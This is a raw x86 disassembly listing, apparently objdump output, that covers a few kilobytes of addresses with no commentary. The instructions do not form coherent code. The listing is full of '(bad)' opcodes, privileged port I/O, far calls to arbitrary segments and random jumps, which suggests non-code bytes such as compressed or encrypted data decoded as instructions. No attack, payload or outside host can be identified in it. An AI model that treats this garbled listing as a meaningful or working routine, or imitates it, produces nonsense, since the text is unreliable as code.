  40a203:	xor    ebx,DWORD PTR [ebx+0x59]
  40a206:	popf   
  40a207:	outs   dx,BYTE PTR ds:[esi]
  40a208:	add    BYTE PTR [eax-0x1a722616],0x0
  40a20f:	and    ah,dh
  40a211:	test   DWORD PTR [ebx],esi
  40a213:	in     al,0x19
  40a215:	sti    
  40a216:	nop
  40a217:	scas   eax,DWORD PTR es:[edi]
  40a218:	adc    eax,0x4ffcd44b
  40a21d:	in     eax,dx
  40a21e:	or     edi,DWORD PTR [esi-0x31]
  40a221:	daa    
  40a222:	dec    ebx
  40a223:	xor    BYTE PTR [esi+edi*2-0x341cf905],cl
  40a22a:	xlat   BYTE PTR ds:[ebx]
  40a22b:	cld    
  40a22c:	adc    bh,BYTE PTR [edi+0x50]
  40a22f:	dec    ecx
  40a230:	in     eax,0xd9
  40a232:	ss jb  0x40a22c
  40a235:	pop    ebx
  40a236:	in     eax,0xfa
  40a238:	clc    
  40a239:	call   0xb5d1:0x8cf0956d
  40a240:	dec    ebx
  40a241:	or     cl,BYTE PTR [ebp-0x633a61f]
  40a247:	(bad)  
  40a248:	jmp    0x40a27b
  40a24a:	pop    edx
  40a24b:	mov    ah,0xbf
  40a24d:	gs or  eax,ebx
  40a250:	lods   al,BYTE PTR ds:[esi]
  40a251:	addr16 push esp
  40a253:	ror    DWORD PTR [esi-0x2e],cl
  40a256:	(bad)  
  40a258:	fld    QWORD PTR [ebx]
  40a25a:	jbe    0x40a27e
  40a25c:	push   cs
  40a25d:	jbe    0x40a280
  40a25f:	mov    ebx,0x62be9496
  40a264:	push   ds
  40a265:	jno    0x40a298
  40a267:	arpl   dx,bx
  40a269:	pop    esp
  40a26a:	pusha  
  40a26b:	dec    ecx
  40a26c:	int    0x73
  40a26e:	adc    eax,0xb35ddbbd
  40a273:	out    0x87,al
  40a275:	es push edx
  40a277:	add    BYTE PTR ds:0x9bac1a01,dh
  40a27d:	gs ins DWORD PTR es:[edi],dx
  40a27f:	stos   DWORD PTR es:[edi],eax
  40a280:	mov    ds:0xdd53db1e,eax
  40a285:	xor    BYTE PTR [edx+0x7080bfef],dh
  40a28b:	adc    ecx,DWORD PTR [ebx]
  40a28d:	sbb    al,0x86
  40a28f:	aad    0x1a
  40a291:	daa    
  40a292:	or     eax,0x79c9ea6d
  40a297:	or     al,0x81
  40a299:	xor    al,0x2b
  40a29b:	dec    edi
  40a29c:	and    BYTE PTR [edi+0x55868f4],cl
  40a2a2:	sbb    al,BYTE PTR [edx-0x80]
  40a2a5:	xor    al,0xe1
  40a2a7:	(bad)  
  40a2a9:	push   eax
  40a2aa:	mov    esi,0x97994e16
  40a2af:	jne    0x40a253
  40a2b1:	pop    ebp
  40a2b2:	test   BYTE PTR [ecx-0x6df98b3c],0xf4
  40a2b9:	scas   al,BYTE PTR es:[edi]
  40a2ba:	stc    
  40a2bb:	push   ebx
  40a2bc:	add    BYTE PTR ds:0xf42053af,ch
  40a2c2:	add    al,cl
  40a2c4:	ja     0x40a345
  40a2c6:	xor    esp,ecx
  40a2c8:	repz cmp DWORD PTR [ebx],ecx
  40a2cb:	out    0x93,al
  40a2cd:	mov    eax,ds:0xf8aec319
  40a2d2:	xor    eax,0xfd3662c2
  40a2d7:	xchg   esi,eax
  40a2d8:	int    0x9d
  40a2da:	icebp  
  40a2db:	retf   0x1a69
  40a2de:	jae    0x40a295
  40a2e0:	push   esi
  40a2e1:	mov    esp,0x5a1d69e8
  40a2e6:	mov    eax,ds:0xe6b3a80f
  40a2eb:	cmp    ebp,DWORD PTR [edi+0x7f]
  40a2ee:	aaa    
  40a2ef:	inc    edx
  40a2f0:	and    dl,al
  40a2f2:	dec    esp
  40a2f3:	pushf  
  40a2f4:	stos   BYTE PTR es:[edi],al
  40a2f5:	and    ebp,DWORD PTR [ecx+0x38e74fe4]
  40a2fb:	(bad)  
  40a2fc:	out    dx,eax
  40a2fd:	cmp    eax,0xfd56c64e
  40a302:	movd   mm7,DWORD PTR [ebx+ebx*8-0x64]
  40a307:	jno    0x40a32f
  40a309:	fwait
  40a30a:	in     al,dx
  40a30b:	div    DWORD PTR [esi-0x34]
  40a30e:	loopne 0x40a362
  40a310:	inc    ebp
  40a311:	(bad)  
  40a312:	clc    
  40a313:	jne    0x40a36b
  40a315:	dec    eax
  40a316:	int3   
  40a317:	inc    esi
  40a318:	repnz cmp bh,ch
  40a31b:	sbb    BYTE PTR [edi+0x1cbfe88a],cl
  40a321:	enter  0xce57,0x5
  40a325:	daa    
  40a326:	fisttp WORD PTR [edi+0x78ed79b4]
  40a32c:	dec    edx
  40a32d:	pop    ss
  40a32e:	xchg   edi,eax
  40a32f:	pusha  
  40a330:	jmp    0xa813adf
  40a335:	xchg   esi,eax
  40a336:	bound  ecx,QWORD PTR [edi]
  40a338:	std    
  40a339:	test   al,0x36
  40a33b:	pop    es
  40a33c:	aas    
  40a33d:	loopne 0x40a306
  40a33f:	dec    esp
  40a340:	scas   eax,DWORD PTR es:[edi]
  40a341:	jg     0x40a32a
  40a343:	sbb    al,0x8f
  40a345:	push   esi
  40a346:	cmp    cl,al
  40a348:	jmp    0x40a343
  40a34a:	inc    ebx
  40a34b:	das    
  40a34c:	dec    edx
  40a34d:	pop    ecx
  40a34e:	aam    0xbd
  40a350:	dec    edi
  40a351:	and    BYTE PTR [ecx],al
  40a353:	cwde   
  40a354:	xchg   eax,edi
  40a356:	push   ss
  40a357:	pop    esp
  40a358:	push   esp
  40a359:	xchg   ecx,eax
  40a35a:	jecxz  0x40a31b
  40a35c:	push   cs
  40a35d:	mov    al,0x78
  40a35f:	xchg   esp,eax
  40a360:	xor    al,0xc9
  40a362:	mov    gs,WORD PTR [eax+0x1579d6cc]
  40a368:	inc    edi
  40a369:	pmaddwd mm3,QWORD PTR [ecx-0x5e64cbb3]
  40a370:	int    0x14
  40a372:	pop    esi
  40a373:	xchg   edx,eax
  40a374:	cmp    DWORD PTR [edi+eax*1-0x6a454a1b],edx
  40a37b:	(bad)  
  40a37c:	cmp    bh,dl
  40a37e:	cmp    edi,DWORD PTR [esi-0x415e4b1a]
  40a384:	js     0x40a361
  40a386:	fisttp DWORD PTR [ebx-0x75]
  40a389:	data16 jae 0x40a341
  40a38c:	cmp    BYTE PTR [eax+0x41a02bcf],ch
  40a392:	mov    dl,0xe3
  40a394:	out    0x2c,eax
  40a396:	adc    ch,BYTE PTR [eax+ecx*2-0x32c608af]
  40a39d:	ret    
  40a39e:	mov    WORD PTR [ebx-0x22e6dc87],es
  40a3a4:	rol    DWORD PTR [eax-0x28],0xf6
  40a3a8:	mov    esi,0x8c4e6fda
  40a3ad:	xor    al,cl
  40a3af:	mov    al,ds:0xfd9ae442
  40a3b4:	push   eax
  40a3b5:	mov    ebp,0xb425f2df
  40a3ba:	mov    al,ds:0x20468764
  40a3bf:	or     ah,0x5d
  40a3c2:	in     eax,0x9b
  40a3c4:	pop    ebp
  40a3c5:	inc    eax
  40a3c6:	jle    0x40a42c
  40a3c8:	cmp    al,0xb7
  40a3ca:	jmp    0x8105:0x15d98f5a
  40a3d1:	xor    cl,dl
  40a3d3:	mov    ch,0x92
  40a3d5:	mov    dh,0x3
  40a3d7:	jno    0x40a35e
  40a3d9:	idiv   DWORD PTR [esi+0x7]
  40a3dc:	or     DWORD PTR [edx-0x1971ec50],0x6d
  40a3e3:	pop    esi
  40a3e4:	and    eax,0x35e1b856
  40a3e9:	test   al,0xc2
  40a3eb:	and    eax,0x2ed1ee89
  40a3f0:	jbe    0x40a436
  40a3f2:	sub    BYTE PTR [edi+0x457d718c],dl
  40a3f8:	sbb    BYTE PTR [edi-0x22],dl
  40a3fb:	xor    al,0x41
  40a3fd:	push   edx
  40a3fe:	aaa    
  40a3ff:	sbb    al,BYTE PTR [esi+0x3e]
  40a402:	xor    eax,0xd9cc69fc
  40a407:	and    al,0x90
  40a409:	dec    edi
  40a40a:	or     BYTE PTR [edi-0x51],0x18
  40a40e:	mov    ebx,0x403f411c
  40a413:	js     0x40a435
  40a415:	mov    ah,0x8e
  40a417:	inc    esi
  40a418:	lods   eax,DWORD PTR ds:[esi]
  40a419:	and    bh,dh
  40a41b:	xchg   DWORD PTR [edi-0x14],ecx
  40a41e:	jge    0x40a470
  40a420:	aad    0x9b
  40a422:	xchg   ebp,eax
  40a423:	mov    BYTE PTR [edi+0x3b5f8872],dl
  40a429:	lods   eax,DWORD PTR ds:[esi]
  40a42a:	ret    0x2d08
  40a42d:	cs mov ah,0x24
  40a430:	mov    edx,0x4cd41a35
  40a435:	pop    DWORD PTR [esi-0x1e]
  40a438:	jae    0x40a45d
  40a43a:	std    
  40a43b:	out    0xda,al
  40a43d:	nop
  40a43e:	cmc    
  40a43f:	repz xchg esp,eax
  40a441:	xchg   ebx,eax
  40a442:	push   edx
  40a443:	mov    edi,0x53eb17b9
  40a448:	popa   
  40a449:	lock (bad) 
  40a44c:	xchg   ebp,eax
  40a44d:	mov    esp,DWORD PTR ds:0xcd5efb01
  40a453:	xor    eax,0x96c7ab64
  40a458:	and    DWORD PTR [ebp-0x7128009d],ebp
  40a45e:	push   0xc8724035
  40a463:	inc    esp
  40a464:	ficom  WORD PTR ds:[edx+0x2188864b]
  40a46b:	xchg   esi,eax
  40a46c:	neg    BYTE PTR [edi]
  40a46e:	scas   al,BYTE PTR es:[edi]
  40a46f:	ror    DWORD PTR [edi],0x92
  40a472:	push   eax
  40a473:	jns    0x40a451
  40a475:	imul   ebp,ebx,0xdbb3290d
  40a47b:	in     al,0xe
  40a47d:	mov    WORD PTR [ebp-0x7a84c148],?
  40a483:	jmp    0x59e3a77b
  40a488:	push   0x32
  40a48a:	mov    ?,WORD PTR [ecx]
  40a48c:	imul   edi,DWORD PTR [esi+0x63],0x5b
  40a490:	call   0x3928:0xbf222d71
  40a497:	xchg   edx,eax
  40a498:	cmp    al,0x32
  40a49a:	mov    ebx,0x2846d029
  40a49f:	inc    eax
  40a4a0:	jno    0x40a51a
  40a4a2:	push   ss
  40a4a3:	stos   BYTE PTR es:[edi],al
  40a4a4:	inc    eax
  40a4a5:	mov    esp,0xea058ad1
  40a4aa:	test   al,0xdd
  40a4ac:	rcl    esi,cl
  40a4ae:	adc    DWORD PTR [esi+edx*1-0x70],esp
  40a4b2:	repz pop ss
  40a4b4:	pop    ecx
  40a4b5:	push   esp
  40a4b6:	in     eax,dx
  40a4b7:	jnp    0x40a4ef
  40a4b9:	stos   DWORD PTR es:[edi],eax
  40a4ba:	xor    DWORD PTR [edi-0x7c],edi
  40a4bd:	add    DWORD PTR [esi],ebx
  40a4bf:	xor    dl,BYTE PTR [esi]
  40a4c1:	(bad)  
  40a4c2:	fnstsw WORD PTR [edi]
  40a4c4:	je     0x40a46a
  40a4c6:	in     al,dx
  40a4c7:	sti    
  40a4c8:	sbb    eax,0xcd6101d9
  40a4ce:	popf   
  40a4cf:	loop   0x40a4de
  40a4d1:	out    0x26,al
  40a4d3:	cmp    DWORD PTR [esi],edx
  40a4d5:	call   0xb74b:0x2dc74142
  40a4dc:	mov    es,ebp
  40a4de:	jnp    0x40a4b6
  40a4e0:	adc    esp,DWORD PTR [eax]
  40a4e2:	clc    
  40a4e3:	mov    cl,0x2
  40a4e5:	sar    BYTE PTR [esi],1
  40a4e7:	mov    WORD PTR [esi+0x7258b5a6],?
  40a4ed:	fld    TBYTE PTR [edx+eax*4-0x7f9fcef5]
  40a4f4:	mov    gs,WORD PTR [ebx+ecx*2-0x5c409e39]
  40a4fb:	(bad)  
  40a4fc:	(bad)  
  40a4fd:	in     al,dx
  40a4fe:	xchg   esp,eax
  40a4ff:	aad    0xe1
  40a501:	repz push ss
  40a503:	loop   0x40a4a4
  40a505:	rcl    DWORD PTR [eax+0x24bd246f],1
  40a50b:	fsub   DWORD PTR [ecx]
  40a50d:	xchg   ebx,eax
  40a50e:	nop
  40a50f:	ret    
  40a510:	gs xchg edx,eax
  40a512:	push   es
  40a513:	sbb    DWORD PTR [edi],ebp
  40a515:	fstp   QWORD PTR [edx-0x5d]
  40a518:	lods   al,BYTE PTR ds:[esi]
  40a519:	jecxz  0x40a537
  40a51b:	ret    0xae94
  40a51e:	mov    al,ds:0x9043a2c
  40a523:	mov    dh,0x55
  40a525:	fstp   DWORD PTR [eax-0x70bb77dc]
  40a52b:	jp     0x40a544
  40a52d:	scas   eax,DWORD PTR es:[edi]
  40a52e:	adc    dh,BYTE PTR [edx]
  40a530:	cmp    eax,0x2cbec09d
  40a535:	jne    0x40a56e
  40a537:	ss ja  0x40a56d
  40a53a:	dec    edx
  40a53b:	xchg   esp,eax
  40a53c:	ss or  eax,0x71bb424c
  40a542:	cmc    
  40a543:	adc    DWORD PTR [ebx-0x79],esi
  40a546:	shr    ah,1
  40a548:	pop    edx
  40a549:	icebp  
  40a54a:	dec    eax
  40a54b:	jmp    0x40a593
  40a54d:	sub    edx,DWORD PTR [edi+0x31]
  40a550:	mov    cl,0x65
  40a552:	cmp    al,0x72
  40a554:	clc    
  40a555:	xor    eax,0xbf843b94
  40a55a:	jns    0x40a51c
  40a55c:	ds dec esp
  40a55e:	inc    ebx
  40a55f:	pop    esp
  40a560:	or     BYTE PTR [esi+ebx*4-0x6f],cl
  40a564:	dec    ecx
  40a565:	fimul  DWORD PTR [edi+esi*1]
  40a568:	addr16 out dx,al
  40a56a:	sbb    eax,0xe12ba2fe
  40a56f:	xchg   BYTE PTR [ecx+ebx*2],cl
  40a572:	mov    ch,0xff
  40a574:	sub    dh,BYTE PTR [eax-0x5c]
  40a577:	cmp    ah,BYTE PTR [ecx+0x56d75c9c]
  40a57d:	dec    edi
  40a57e:	ins    BYTE PTR es:[edi],dx
  40a57f:	xchg   ebx,eax
  40a580:	push   cs
  40a581:	sbb    eax,0x5516e0e9
  40a586:	jae    0x40a5e8
  40a588:	push   DWORD PTR [edi-0x63]
  40a58b:	out    dx,eax
  40a58c:	in     eax,dx
  40a58d:	push   esi
  40a58e:	lds    esi,FWORD PTR [ebx]
  40a590:	dec    esi
  40a591:	pop    es
  40a592:	pop    ebp
  40a593:	cmp    eax,0x2ef21494
  40a598:	jmp    0x4c0d1417
  40a59d:	jecxz  0x40a5d4
  40a59f:	or     DWORD PTR [ecx+0x765a0259],ebp
  40a5a5:	xchg   ebx,eax
  40a5a6:	adc    BYTE PTR [ebp-0x77],ch
  40a5a9:	addr16 je 0x40a58c
  40a5ac:	fmul   DWORD PTR [ebx-0x43dccebf]
  40a5b2:	sub    BYTE PTR [ecx-0x44368be1],al
  40a5b8:	xchg   ebx,eax
  40a5b9:	adc    DWORD PTR [ebp-0x1caa2658],0x1a86b0d
  40a5c3:	sahf   
  40a5c4:	(bad)  
  40a5c5:	mov    esp,0xd615ee30
  40a5ca:	outs   dx,BYTE PTR ds:[esi]
  40a5cb:	jns    0x40a55e
  40a5cd:	mov    DWORD PTR ds:0x1211c00a,ebx
  40a5d3:	rcl    BYTE PTR [ebp+0x16],0x6b
  40a5d7:	jg     0x40a5c3
  40a5d9:	push   ss
  40a5da:	inc    ebx
  40a5db:	xor    al,0x2a
  40a5dd:	(bad)  
  40a5de:	adc    bl,BYTE PTR [eax]
  40a5e0:	sahf   
  40a5e1:	int    0x94
  40a5e3:	cmp    edi,DWORD PTR [edx+0x40d79af]
  40a5e9:	pushf  
  40a5ea:	fldln2 
  40a5ec:	pop    ebp
  40a5ed:	mov    dl,0x92
  40a5ef:	cli    
  40a5f0:	int    0x85
  40a5f2:	xor    BYTE PTR [edx-0x242ead28],dh
  40a5f8:	pop    edx
  40a5f9:	(bad)
  40a5fe:	jmp    0xa83b1164
  40a603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a604:	sbb    BYTE PTR [ecx+ebx*8],dh
  40a607:	fst    st(5)
  40a609:	cmc    
  40a60a:	xchg   esi,eax
  40a60b:	repz test eax,0x9f57f360
  40a611:	sub    edi,esp
  40a613:	xor    eax,DWORD PTR [edx]
  40a615:	aaa    
  40a616:	nop
  40a617:	xor    bl,BYTE PTR [ebx-0x6e]
  40a61a:	xchg   BYTE PTR [edx],dh
  40a61c:	pop    edx
  40a61d:	jbe    0x40a67a
  40a61f:	ficom  WORD PTR [edx-0x5e]
  40a622:	cdq    
  40a623:	xchg   ebp,eax
  40a624:	add    DWORD PTR [ebx],esi
  40a626:	int    0x13
  40a628:	xlat   BYTE PTR ds:[ebx]
  40a629:	mov    esp,0xd3a92e5e
  40a62e:	pop    eax
  40a62f:	aaa    
  40a630:	jne    0x40a68a
  40a632:	test   al,0x2
  40a634:	push   0x61
  40a636:	scas   al,BYTE PTR es:[edi]
  40a637:	inc    eax
  40a638:	pop    esi
  40a639:	js     0x40a5d6
  40a63b:	pop    eax
  40a63c:	in     eax,0xd5
  40a63e:	push   ss
  40a63f:	xor    al,BYTE PTR [edi]
  40a641:	xor    ebx,DWORD PTR [edx+0x79]
  40a644:	mov    dh,0x6e
  40a646:	inc    ecx
  40a647:	push   ecx
  40a648:	scas   al,BYTE PTR es:[edi]
  40a649:	jnp    0x40a6aa
  40a64b:	mov    eax,ds:0xacadc9cd
  40a650:	jge    0x40a66d
  40a652:	mov    eax,0x11d463cf
  40a657:	push   ebx
  40a658:	pop    ecx
  40a659:	pop    edx
  40a65a:	jmp    0x40a65a
  40a65c:	ficomp DWORD PTR [edi-0x61ae1c9f]
  40a662:	jae    0x40a5f9
  40a664:	mov    BYTE PTR ds:0xe5043dae,bl
  40a66a:	dec    ebp
  40a66b:	dec    ebx
  40a66c:	push   esi
  40a66d:	xchg   esi,eax
  40a66e:	xchg   edx,eax
  40a66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a670:	xchg   ebp,eax
  40a671:	xor    ah,BYTE PTR [eax]
  40a673:	ds mov ebp,0xdc3da192
  40a679:	push   ss
  40a67a:	sbb    eax,0xf03c8a1b
  40a67f:	xchg   ebp,eax
  40a680:	jmp    0x40a699
  40a682:	xchg   ebx,eax
  40a683:	stos   DWORD PTR es:[edi],eax
  40a684:	shl    DWORD PTR [edx+ecx*8],cl
  40a687:	xchg   edi,eax
  40a688:	inc    ebp
  40a689:	add    DWORD PTR [eax+ecx*2-0x80],eax
  40a68d:	adc    esp,ecx
  40a68f:	push   esp
  40a690:	adc    al,0x1
  40a692:	and    DWORD PTR [ebx],ebx
  40a694:	adc    eax,0x26f8a25e
  40a699:	dec    ecx
  40a69a:	rcr    BYTE PTR [ebp+edi*4-0x6e260ca4],1
  40a6a1:	fidiv  DWORD PTR [esi-0x43]
  40a6a4:	lock push esi
  40a6a6:	jecxz  0x40a6a4
  40a6a8:	mov    ebx,0x40931471
  40a6ad:	pop    es
  40a6ae:	sbb    BYTE PTR [edi],bh
  40a6b0:	cld    
  40a6b1:	fucomi st,st(7)
  40a6b4:	pop    ebp
  40a6b5:	push   ebx
  40a6b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6b7:	xlat   BYTE PTR ds:[ebx]
  40a6b8:	ds in  al,dx
  40a6ba:	nop
  40a6bb:	dec    eax
  40a6bc:	cdq    
  40a6bd:	sub    al,0x81
  40a6bf:	dec    esp
  40a6c0:	pop    ebp
  40a6c1:	xchg   ecx,eax
  40a6c2:	and    eax,0xbad34c9c
  40a6c7:	data16 jns 0x40a6fa
  40a6ca:	clc    
  40a6cb:	cli    
  40a6cc:	push   ebx
  40a6cd:	mov    dh,0x7b
  40a6cf:	in     al,dx
  40a6d0:	fldz   
  40a6d2:	sub    eax,0xef904126
  40a6d7:	data16 out dx,al
  40a6d9:	test   bh,dh
  40a6db:	pop    ebp
  40a6dc:	out    dx,al
  40a6dd:	hlt    
  40a6de:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40a6e0:	(bad)  
  40a6e1:	mov    ds:0xe7756d6f,eax
  40a6e6:	cdq    
  40a6e7:	push   ecx
  40a6e8:	in     al,dx
  40a6e9:	xchg   esp,eax
  40a6ea:	out    dx,eax
  40a6eb:	fimul  DWORD PTR [ebx-0x771346c4]
  40a6f1:	into   
  40a6f2:	cmp    BYTE PTR [ecx-0x66c67626],dl
  40a6f8:	dec    ebp
  40a6f9:	mov    edi,0x9532a93b
  40a6fe:	mov    bh,0xe
  40a700:	cmp    eax,0x704eb951
  40a705:	int3   
  40a706:	dec    edx
  40a707:	ja     0x40a6ec
  40a709:	sbb    BYTE PTR [ecx-0x36],0x92
  40a70d:	or     al,0xd
  40a70f:	into   
  40a710:	mov    dh,0x16
  40a712:	ja     0x40a707
  40a714:	pop    ecx
  40a715:	imul   BYTE PTR [ebx+edx*4+0x2a]
  40a719:	outs   dx,BYTE PTR ds:[esi]
  40a71a:	fsub   st(2),st
  40a71c:	mov    ch,0x65
  40a71e:	or     eax,0xd9da301e
  40a723:	fisttp DWORD PTR [ecx+0x51]
  40a726:	std    
  40a727:	(bad)  
  40a728:	iret   
  40a729:	inc    edx
  40a72a:	test   DWORD PTR [edx+edx*2+0x70],ecx
  40a72e:	sub    ebx,ecx
  40a730:	pop    esp
  40a731:	jmp    0x8db9:0x5dca36c2
  40a738:	push   ecx
  40a739:	ins    BYTE PTR es:[edi],dx
  40a73a:	or     eax,0x3821c561
  40a73f:	icebp  
  40a740:	inc    edx
  40a741:	in     eax,dx
  40a742:	push   ss
  40a743:	test   bh,bl
  40a745:	adc    eax,0x7fdf888e
  40a74a:	push   eax
  40a74b:	and    BYTE PTR [edi],0x4f
  40a74e:	inc    ebp
  40a74f:	dec    esp
  40a750:	xor    BYTE PTR [ecx],cl
  40a752:	or     ch,bh
  40a754:	pusha  
  40a755:	imul   edx,DWORD PTR [eax],0xffffffba
  40a758:	out    0x26,al
  40a75a:	ficomp WORD PTR [esi]
  40a75c:	mov    edi,0xec46fc03
  40a761:	mov    edi,0x7821600b
  40a766:	inc    ebp
  40a767:	mov    ebx,0xcc0262ad
  40a76c:	test   BYTE PTR [edx],ch
  40a76e:	inc    BYTE PTR [eax]
  40a770:	out    dx,al
  40a771:	inc    esi
  40a772:	outs   dx,DWORD PTR ds:[esi]
  40a773:	push   edx
  40a774:	inc    esi
  40a775:	(bad)  
  40a776:	adc    al,0x8
  40a778:	jno    0x40a72c
  40a77a:	adc    eax,0xe478746b
  40a77f:	xchg   edx,eax
  40a780:	mov    esi,0x21a16bc7
  40a785:	xchg   ebp,eax
  40a786:	cmp    DWORD PTR [eax+0x6b609fb1],eax
  40a78c:	sbb    al,0xb1
  40a78e:	mov    bl,0x67
  40a790:	cld    
  40a791:	(bad)  
  40a792:	and    BYTE PTR [edi-0x18df33c],bh
  40a798:	ret    0x23d4
  40a79b:	sub    bh,BYTE PTR [ecx-0x4]
  40a79e:	push   ebx
  40a79f:	add    DWORD PTR ss:[ebx+0x13],edi
  40a7a3:	push   eax
  40a7a4:	xlat   BYTE PTR ds:[ebx]
  40a7a5:	out    dx,eax
  40a7a6:	std    
  40a7a7:	shl    BYTE PTR [ebx],cl
  40a7a9:	push   es
  40a7aa:	in     eax,dx
  40a7ab:	std    
  40a7ac:	jne    0x40a7ce
  40a7ae:	push   ebp
  40a7af:	fdivr  QWORD PTR cs:[edi+0x65]
  40a7b3:	sbb    DWORD PTR [esi],ebx
  40a7b5:	add    eax,0xfb8b46bd
  40a7ba:	mov    bh,0x3c
  40a7bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7bd:	pop    ebp
  40a7be:	shr    BYTE PTR [edi],0x49
  40a7c1:	jge    0x40a79f
  40a7c3:	inc    edx
  40a7c4:	das    
  40a7c5:	sbb    eax,0xe33bcbda
  40a7ca:	sbb    esp,ebx
  40a7cc:	(bad)  
  40a7cd:	dec    ebx
  40a7ce:	pop    ecx
  40a7cf:	les    esi,FWORD PTR [ebp-0x3c]
  40a7d2:	movzx  esp,BYTE PTR [edi]
  40a7d5:	inc    edx
  40a7d6:	hlt    
  40a7d7:	bnd ret 
  40a7d9:	and    edx,DWORD PTR [ecx]
  40a7db:	retf   
  40a7dc:	sub    BYTE PTR [ebp-0x60],al
  40a7df:	sub    eax,DWORD PTR [eax-0x69]
  40a7e2:	mov    ebp,0x83d83357
  40a7e7:	loopne 0x40a866
  40a7e9:	inc    ebx
  40a7ea:	daa    
  40a7eb:	movups xmm3,XMMWORD PTR [ecx-0x20250702]
  40a7f2:	fild   QWORD PTR [edx+eiz*8-0x29]
  40a7f6:	mov    ch,0x13
  40a7f8:	or     edx,DWORD PTR [ebx]
  40a7fa:	(bad)  
  40a7fb:	push   ebx
  40a7fc:	push   es
  40a7fd:	fcmovnb st,st(6)
  40a7ff:	imul   ebp,DWORD PTR [ebx+0x1b],0xc8cef290
  40a806:	and    eax,0x2bfec1fd
  40a80b:	into   
  40a80c:	jg     0x40a84a
  40a80e:	push   esp
  40a80f:	and    bh,BYTE PTR [ebx*8-0x799a84e4]
  40a816:	es into 
  40a818:	push   edx
  40a819:	pop    ebx
  40a81a:	(bad)  
  40a81b:	hlt    
  40a81c:	ja     0x40a7b4
  40a81e:	adc    DWORD PTR [ebp+0x6a],esp
  40a821:	mov    cl,0x2b
  40a823:	sar    DWORD PTR [esi-0x5a],cl
  40a826:	ja     0x40a89e
  40a828:	push   ebp
  40a829:	sbb    eax,0x61a675ee
  40a82e:	leave  
  40a82f:	outs   dx,DWORD PTR ds:[esi]
  40a830:	ss (bad) 
  40a833:	ds cwde 
  40a835:	ins    BYTE PTR es:[edi],dx
  40a836:	sub    al,0xc2
  40a838:	xchg   edx,eax
  40a839:	lahf   
  40a83a:	in     eax,dx
  40a83b:	(bad)  
  40a83c:	push   cs
  40a83d:	xchg   esi,eax
  40a83e:	int3   
  40a83f:	cmp    eax,0x15c791ef
  40a844:	aad    0xb0
  40a846:	cmp    ch,BYTE PTR [ecx]
  40a848:	imul   ebx,esp,0xab3628fe
  40a84e:	mov    ebp,0x777ce493
  40a853:	xchg   edx,eax
  40a854:	js     0x40a812
  40a856:	loopne 0x40a829
  40a858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a859:	mov    esi,0xa747be1f
  40a85e:	cmp    al,0x2c
  40a860:	jle    0x40a87b
  40a862:	inc    esi
  40a863:	retf   
  40a864:	(bad)  
  40a865:	cli    
  40a866:	stc    
  40a867:	stc    
  40a868:	mov    cl,0x41
  40a86a:	adc    al,0xc1
  40a86c:	mov    fs,WORD PTR [eax+0x2573b82b]
  40a872:	inc    ecx
  40a873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a874:	xor    al,0x0
  40a876:	push   0x489107bd
  40a87b:	out    0x47,al
  40a87d:	jg     0x40a8c5
  40a87f:	(bad)  
  40a880:	jp     0x40a87c
  40a882:	hlt    
  40a883:	jge    0x40a828
  40a885:	out    0xe7,al
  40a887:	ret    
  40a888:	fwait
  40a889:	sub    bl,bl
  40a88b:	add    eax,0x7e43239d
  40a890:	push   cs
  40a891:	jnp    0x40a8c2
  40a893:	les    ecx,FWORD PTR [ebx+0x31]
  40a896:	cmp    WORD PTR [edx-0x24],ax
  40a89a:	mov    al,0x4e
  40a89c:	sar    DWORD PTR [ebx],0x6a
  40a89f:	xchg   DWORD PTR [ebx-0xd],edi
  40a8a2:	daa    
  40a8a3:	pop    ecx
  40a8a4:	gs (bad) 
  40a8a6:	xchg   esp,eax
  40a8a7:	mov    dl,0xfc
  40a8a9:	mov    esi,DWORD PTR [esi-0x59]
  40a8ac:	in     al,0x1c
  40a8ae:	xchg   edx,eax
  40a8af:	(bad)  
  40a8b0:	mov    al,ds:0xb5770db1
  40a8b5:	out    dx,eax
  40a8b6:	fbld   TBYTE PTR ds:0x32a3fd54
  40a8bc:	xchg   esp,eax
  40a8bd:	xchg   edx,eax
  40a8be:	test   eax,0xdc3cbda9
  40a8c3:	pushf  
  40a8c4:	jl     0x40a8cc
  40a8c6:	mov    ds:0x8caf0782,al
  40a8cb:	mov    ch,0xca
  40a8cd:	bound  edx,QWORD PTR ds:0xfcce3fc4
  40a8d3:	lock xor BYTE PTR [edx-0x73],0x6b
  40a8d8:	ja     0x40a916
  40a8da:	fsubr  QWORD PTR [edx-0x4d8f99b]
  40a8e0:	push   ds
  40a8e1:	ror    BYTE PTR [edi-0x5c],0xcd
  40a8e5:	push   esp
  40a8e6:	out    0xc6,eax
  40a8e8:	dec    ecx
  40a8e9:	stos   DWORD PTR es:[edi],eax
  40a8ea:	imul   ebp,DWORD PTR [ecx+0x30],0x89b9c339
  40a8f1:	and    ch,BYTE PTR [edi+0x2d]
  40a8f4:	push   esi
  40a8f5:	or     DWORD PTR fs:[edi+0x1f45ccb2],esi
  40a8fc:	inc    esi
  40a8fd:	jp     0x40a8c6
  40a8ff:	dec    edi
  40a900:	jmp    0x823a9a3b
  40a905:	fmul   QWORD PTR [esi+0x30]
  40a908:	cmp    eax,0x2a75c538
  40a90d:	jbe    0x40a8b2
  40a90f:	sbb    al,0xee
  40a911:	inc    eax
  40a912:	pop    esp
  40a913:	aas    
  40a914:	inc    esp
  40a915:	jmp    0x2e70d578
  40a91a:	sbb    BYTE PTR [ebx+eax*2-0x74],ah
  40a91e:	cmp    ebp,DWORD PTR ds:0xb2991504
  40a924:	mov    dl,0x55
  40a926:	jp     0x40a914
  40a928:	out    0xf,al
  40a92a:	outs   dx,DWORD PTR ds:[esi]
  40a92b:	scas   eax,DWORD PTR es:[edi]
  40a92c:	xor    eax,0x134b9c9c
  40a931:	dec    eax
  40a932:	xlat   BYTE PTR ds:[ebx]
  40a933:	cmp    ebx,ebx
  40a935:	mov    dh,BYTE PTR [edi-0x47989da3]
  40a93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a93c:	mov    esi,0xec7d6932
  40a941:	enter  0x5482,0x46
  40a945:	leave  
  40a946:	push   ds
  40a947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
